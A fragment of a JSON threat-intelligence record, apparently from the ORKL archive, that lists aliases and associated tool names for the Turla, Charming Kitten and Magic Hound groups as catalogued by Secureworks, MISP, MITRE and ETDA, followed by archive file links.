                " Mosquito",
                " Nautilus",
                " Neuron",
                " Penquin",
                " PoisonFrog",
                " PyFlash",
                " Skipper",
                " Snake",
                " Tavdig",
                " TinyTurla",
                " Tunnus",
                "Carbon-DLL"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "029625d2-9734-44f9-9e10-b894b4f57f08",
            "created_at": "2023-01-06T13:46:38.364105Z",
            "updated_at": "2025-03-27T02:00:02.815023Z",
            "deleted_at": null,
            "main_name": "Charming Kitten",
            "aliases": [
                "Parastoo",
                "iKittens",
                "Group 83",
                "NewsBeef",
                "G0058",
                "CharmingCypress"
            ],
            "source_name": "MISPGALAXY:Charming Kitten",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "08a3b64c-8e18-455d-af57-28dca63808c4",
            "created_at": "2024-05-01T02:03:08.027871Z",
            "updated_at": "2025-03-27T02:05:17.313679Z",
            "deleted_at": null,
            "main_name": "COBALT ILLUSION",
            "aliases": [
                "APT42 ",
                "Charming Kitten ",
                "CharmingCypress ",
                "ITG18 ",
                "Magic Hound ",
                "Mint Sandstorm sub-group ",
                "NewsBeef ",
                "Newscaster ",
                "PHOSPHORUS sub-group ",
                "TA453 ",
                "UNC788 ",
                "Yellow Garuda ",
                "APT35 "
            ],
            "source_name": "Secureworks:COBALT ILLUSION",
            "tools": [
                " MagicHound Toolset",
                " PupyRAT",
                "Browser Exploitation Framework (BeEF)"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "a97fee0d-af4b-4661-ae17-858925438fc4",
            "created_at": "2023-01-06T13:46:38.396415Z",
            "updated_at": "2025-03-27T02:00:02.823045Z",
            "deleted_at": null,
            "main_name": "Turla",
            "aliases": [
                "Uroburos",
                "Hippo Team",
                "Pacifier APT",
                "MAKERSMARK",
                "ATK13",
                "UAC-0003",
                "IRON HUNTER",
                "Waterbug",
                "TAG_0530",
                "KRYPTON",
                "Popeye",
                "SIG23",
                "UAC-0144",
                "G0010",
                "Blue Python",
                "VENOMOUS Bear",
                "Group 88",
                "Pfinet",
                "ITG12",
                "UNC4210",
                "Secret Blizzard",
                "UAC-0024"
            ],
            "source_name": "MISPGALAXY:Turla",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "e3676dfe-3d40-4b3a-bfbd-4fc1f8c896f4",
            "created_at": "2022-10-25T15:50:23.808974Z",
            "updated_at": "2025-03-27T02:00:55.550912Z",
            "deleted_at": null,
            "main_name": "Magic Hound",
            "aliases": [
                "Magic Hound",
                "TA453",
                "COBALT ILLUSION",
                "Charming Kitten",
                "ITG18",
                "Phosphorus",
                "APT35",
                "Mint Sandstorm"
            ],
            "source_name": "MITRE:Magic Hound",
            "tools": [
                "Impacket",
                "CharmPower",
                "FRP",
                "Mimikatz",
                "Systeminfo",
                "ipconfig",
                "netsh",
                "PowerLess",
                "Pupy",
                "DownPaper",
                "PsExec",
                "Havij",
                "sqlmap"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "1699fb41-b83f-42ff-a6ec-984ae4a1031f",
            "created_at": "2022-10-25T16:07:23.83826Z",
            "updated_at": "2025-03-27T02:02:09.995863Z",
            "deleted_at": null,
            "main_name": "Magic Hound",
            "aliases": [
                "APT 35",
                "Ballistic Bobcat",
                "Charming Kitten",
                "CharmingCypress",
                "Cobalt Illusion",
                "Cobalt Mirage",
                "Educated Manticore",
                "Magic Hound",
                "Mint Sandstorm",
                "Operation BadBlood",
                "Operation Sponsoring Access",
                "Operation SpoofedScholars",
                "Operation Thamar Reservoir",
                "Phosphorus",
                "TA453",
                "TEMP.Beanie",
                "Tarh Andishan",
                "Timberworm",
                "TunnelVision",
                "UNC788",
                "Yellow Garuda"
            ],
            "source_name": "ETDA:Magic Hound",
            "tools": [
                "7-Zip",
                "AnvilEcho",
                "BASICSTAR",
                "CORRUPT KITTEN",
                "CWoolger",
                "CharmPower",
                "ChromeHistoryView",
                "CommandCam",
                "DistTrack",
                "DownPaper",
                "FRP",
                "Fast Reverse Proxy",
                "FireMalv",
                "Ghambar",
                "GoProxy",
                "GorjolEcho",
                "HYPERSCRAPE",
                "Havij",
                "MPK",
                "MPKBot",
                "Matryoshka",
                "Matryoshka RAT",
                "MediaPl",
                "Mimikatz",
                "MischiefTut",
                "NETWoolger",
                "NOKNOK",
                "PINEFLOWER",
                "POWERSTAR",
                "PowerLess Backdoor",
                "PsList",
                "Pupy",
                "PupyRAT",
                "SNAILPROXY",
                "Shamoon",
                "TDTESS",
                "WinRAR",
                "WoolenLogger",
                "Woolger",
                "pupy",
                "sqlmap"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "d11c89bb-1640-45fa-8322-6f4e4053d7f3",
            "created_at": "2022-10-25T15:50:23.509601Z",
            "updated_at": "2025-03-27T02:00:55.487991Z",
            "deleted_at": null,
            "main_name": "Turla",
            "aliases": [
                "Turla",
                "IRON HUNTER",
                "Group 88",
                "Waterbug",
                "WhiteBear",
                "Krypton",
                "Venomous Bear",
                "Secret Blizzard",
                "BELUGASTURGEON"
            ],
            "source_name": "MITRE:Turla",
            "tools": [
                "PsExec",
                "nbtstat",
                "ComRAT",
                "netstat",
                "certutil",
                "KOPILUWAK",
                "IronNetInjector",
                "LunarWeb",
                "Arp",
                "Uroburos",
                "PowerStallion",
                "Kazuar",
                "Systeminfo",
                "LightNeuron",
                "Mimikatz",
                "Tasklist",
                "LunarMail",
                "HyperStack",
                "NBTscan",
                "TinyTurla",
                "Penquin",
                "LunarLoader"
            ],
            "source_id": "MITRE",
            "reports": null
        }
    ],
    "ts_created_at": 1673535867,
    "ts_updated_at": 1743041780,
    "ts_creation_date": 1653617528,
    "ts_modification_date": 1653617528,
    "files": {
        "pdf": "https://archive.orkl.eu/a3a4f67e764f20048166537678f7259ec101e6ba.pdf",
        "text": "https://archive.orkl.eu/a3a4f67e764f20048166537678f7259ec101e6ba.txt",
        "img": "https://archive.orkl.eu/a3a4f67e764f20048166537678f7259ec101e6ba.jpg"
    }
}